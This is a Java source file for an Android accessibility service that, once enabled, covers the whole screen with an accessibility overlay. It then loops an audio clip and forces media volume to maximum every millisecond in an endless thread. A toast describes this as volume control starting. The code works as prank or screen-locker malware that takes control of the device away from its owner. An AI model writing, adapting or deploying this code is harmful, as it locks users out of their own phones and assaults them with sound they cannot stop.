package com.example.lyt.temp;

import com.example.lyt.*;

import android.accessibilityservice.*;
import android.app.Service;
import android.content.Context;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.*;
import android.widget.Toast;

public class SVR extends AccessibilityService {
    public static SVR service;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        WindowManager w = (WindowManager) getSystemService(Service.WINDOW_SERVICE);
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View v = inflater.inflate(R.layout.content_sndactivity, null);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    0,
                    0
            );
            assert w != null;
            w.addView(v, p);
        }
        Toast.makeText(GLB.app(), "音量控制已经开始。", Toast.LENGTH_LONG).show();
        AudioManager ado;
        ado = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        class R extends Thread {
            @Override
            public void run() {
                MediaPlayer m;
                if (GLB.getFLag()) return;
                /* 檢查 */
                GLB.setFlag(1);
                (m = MediaPlayer.create(GLB.app(), com.example.lyt.R.raw.happy)).setLooping(true);
                m.start();
                try {
                    for (; ; ) {
                        ado.setStreamVolume(AudioManager.STREAM_MUSIC, ado.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

                        Thread.sleep(1);
                    }
                } catch (InterruptedException e) {

                }
            }
        }
        new R().start();
        return;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        service = this;
    }

    @Override
    public void onInterrupt() {
        return;
    }
}
